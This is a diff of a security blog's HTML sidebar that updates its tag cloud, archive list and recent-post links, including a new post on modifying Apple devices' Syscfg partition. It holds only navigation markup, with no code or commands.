class="tag-list-item"><a class="tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/diags/" rel="tag">diags</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dirsearch/" rel="tag">dirsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastbin/" rel="tag">fastbin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-leak/" rel="tag">git leak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/header/" rel="tag">header</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap-feng-shui/" rel="tag">heap_feng_shui</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iDevice/" rel="tag">iDevice</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/match/" rel="tag">match</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/one-gadget/" rel="tag">one_gadget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/root/" rel="tag">root</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/safe-linking/" rel="tag">safe-linking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stdout/" rel="tag">stdout</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uaf/" rel="tag">uaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/" rel="tag">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" rel="tag">世界杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="tag">数据泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" rel="tag">问题</a></li></ul>
     </div>
   </div>
 
@@ -1340,7 +1260,7 @@ io.interactive()</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/0day/" style="font-size: 10px;">0day</a> <a href="/tags/2025/" style="font-size: 10px;">2025</a> <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/PHP/" style="font-size: 11.67px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 11.67px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/match/" style="font-size: 10px;">match</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unauthorized/" style="font-size: 10px;">unauthorized</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 11.67px;">反序列化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+      <a href="/tags/0day/" style="font-size: 10px;">0day</a> <a href="/tags/2025/" style="font-size: 10px;">2025</a> <a href="/tags/AppleInternal/" style="font-size: 10px;">AppleInternal</a> <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/PHP/" style="font-size: 11.67px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/diags/" style="font-size: 10px;">diags</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 11.67px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/iDevice/" style="font-size: 10px;">iDevice</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/match/" style="font-size: 10px;">match</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unauthorized/" style="font-size: 10px;">unauthorized</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 11.67px;">反序列化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
     </div>
   </div>
 
@@ -1349,7 +1269,7 @@ io.interactive()</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Archiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">九月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/02/">二月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">九月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li></ul>
     </div>
   </div>
 
@@ -1360,6 +1280,10 @@ io.interactive()</code></pre>
     <h3 class="widget-title">letzter Beitrag</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2026/02/18/%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/">关于Apple产品的无diags修改Syscfg分区</a>
+          </li>
         
           <li>
             <a href="/2026/01/28/i4tools-unauthorized-RCE/">i4tools unauthorized RCE</a>
@@ -1375,10 +1299,6 @@ io.interactive()</code></pre>
         
           <li>
             <a href="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/">2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup</a>
-          </li>
-        
-          <li>
-            <a href="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/">Windows RPC 初探</a>
           </li>
         
       </ul>
